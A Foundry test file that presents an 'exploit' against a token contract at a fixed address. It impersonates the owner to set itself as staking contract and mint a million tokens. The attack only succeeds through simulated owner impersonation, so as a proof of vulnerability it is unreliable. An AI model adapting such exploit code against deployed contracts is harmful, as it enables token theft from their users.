pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBNRG {
    function owner() external view returns (address);
    function setStakingContract(address stakingContractAddress_) external;
    function deliver(address user, uint256 numTokens) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    IBNRG bnrg;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        bnrg = IBNRG(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialErc20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        uint256 amountToMint = 1_000_000 * 1e18;
        address owner = bnrg.owner();

        uint256 initialBnrgBalance = bnrg.balanceOf(attacker);

        vm.startPrank(owner);
        bnrg.setStakingContract(attacker);
        vm.stopPrank();

        bnrg.deliver(attacker, amountToMint);

        uint256 finalBnrgBalance = bnrg.balanceOf(attacker);

        assertGt(finalBnrgBalance, initialBnrgBalance);

        uint256 finalErc20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalErc20Balance, initialErc20Balance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

